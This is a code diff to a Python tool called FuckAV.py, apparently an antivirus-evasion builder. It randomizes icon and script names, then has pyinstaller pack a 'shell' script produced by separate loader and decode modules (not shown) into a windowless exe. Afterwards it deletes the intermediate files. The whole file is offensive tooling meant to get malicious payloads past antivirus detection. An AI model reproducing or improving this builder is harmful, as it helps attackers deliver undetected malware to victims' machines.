@@ -6,6 +6,7 @@ from PIL import ImageDraw
 from PIL import ImageFont
 import random
 
+
 init(autoreset=True)
 # 脚本采用python3.7编写
 # 采用pyinstaller打包，使用之前请安装pyinstaller
@@ -23,8 +24,8 @@ print(f"""
 ║    █████╗      ██║   ██║    ██║         █████╔╝     ███████║██║   ██║      ║
 ║    ██╔══╝      ██║   ██║    ██║         ██╔═██╗     ██╔══██║╚██╗ ██╔╝      ║
 ║    ██║         ╚██████╔╝    ╚██████╗    ██║  ██╗    ██║  ██║ ╚████╔╝       ║
-║    ╚═╝          ╚═════╝      ╚═════╝    ╚═╝  ╚═╝    ╚═╝  ╚═╝  ╚═══╝ V1.2   ║
-║  Author:1frame                                             Time:2021-9-13  ║
+║    ╚═╝          ╚═════╝      ╚═════╝    ╚═╝  ╚═╝    ╚═╝  ╚═╝  ╚═══╝ V1.3   ║
+║  Author:1frame                                             Time:2021-9-23  ║
 ╚============================================================================╝
 """)
 print('\033[1;31;40m''[*]''\033[1;37;40m'" exp: python FuckAV.py")
@@ -35,39 +36,62 @@ print('\033[1;33;40m''[*]''\033[1;37;40m'" 安装依赖库: pip install -r requi
 print()
 print("====================================================================")
 print()
-print('\033[1;31;40m''[1]''\033[1;37;40m'": 编译生成exe")
-print('\033[1;31;40m''[2]''\033[1;37;40m'": 生成powershell脚本（暂未开发）")
+print('\033[1;31;40m''[1]''\033[1;37;40m'": Output exe")
+print('\033[1;31;40m''[2]''\033[1;37;40m'": Output powershell.ps1（暂未开发）")
 xz=input(f"""
-[♥] 选择1/2: """)
+[♥] 选择 1/2: """)
 
 def getRandomStr():
-    chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';
+    chars = '霖阿什顿操大撒德哈卡我被哈韩牛按客户都是嗷对啊空间很聪安徽的abcdefghigklmnopqrstu';
     charLen = len(chars)
     pwd = ''
-    resultLen = random.randint(10, 20)
+    resultLen = random.randint(5, 7)
     while len(pwd) < resultLen:
         pwd += chars[random.randint(0,charLen-1)]
     return pwd
 
-def ico_change():
-    font = ImageFont.truetype("C:\Windows\Fonts\Arial.ttf", 24)
-    imageFile = "ico.ico"
-    im1 = Image.open(imageFile)
-    draw = ImageDraw.Draw(im1)
-    draw.text((random.randint(1,128), random.randint(1,128)), "1frame  "+getRandomStr(), (random.randint(50,220), random.randint(50,220), random.randint(50,220)), font=font)    #设置文字位置/内容/颜色/字体
-    draw = ImageDraw.Draw(im1)
-    im1.save("ico.ico")
+def GeticoDir(dir,ext = None):
+  allfiles = []
+  needExtFilter = (ext != None)
+  for root,dirs,files in os.walk(dir):
+    for filespath in files:
+      filepath = os.path.join(root, filespath)
+      extension = os.path.splitext(filepath)[1][1:]
+      if needExtFilter and extension in ext:
+        allfiles.append(filepath)
+      elif not needExtFilter:
+        allfiles.append(filepath)
+  return allfiles
 
+def rename_ico():
+  global ico
+  global rename
+  rename=getRandomStr()
+  ico=GeticoDir('.\\', ['ico'])[0]
+  print(ico)
+  os.rename(ico, '{0}.ico'.format(rename))
+  ico = rename+'.ico'
+
+
+def filename():
+    l=open('fliename.txt','w+')
+    l.write(rename)
+    l.close()
 
 if xz=="1":
         import loader
-        ico_change()
-        import decode
-        os.system ("pyinstaller -F -w -i ico.ico shell.py -n shell.exe --upx-dir=upx\\")
+        rename_ico()
+        filename()
+        from decode import shellname
+        os.system ("echo pyinstaller -F -w -i {0} {1}.py>{1}.bat ".format(ico,shellname))
+        os.system("{0}.bat ".format(shellname))
+        os.system('del {0}.py'.format(shellname))
+        os.system('del {0}.bat'.format(shellname))
+        os.system('del {0}.spec'.format(shellname))
         print()
         time.sleep(2)
-        print('\033[1;32;40m''[♥]''\033[1;37;40m'"===================exe打包完成====================")
-        print('\033[1;34;40m''[*]''\033[1;37;40m'" exe路径:\dist\shell.exe")
+        print('\033[1;32;40m''[♥]''\033[1;37;40m'"===================EXE打包完成====================")
+        print('\033[1;34;40m''[*]''\033[1;37;40m'" exe路径:\dist\{0}.exe".format(shellname))
         os.system("pause")
         os.system("python fuckav.py")
 
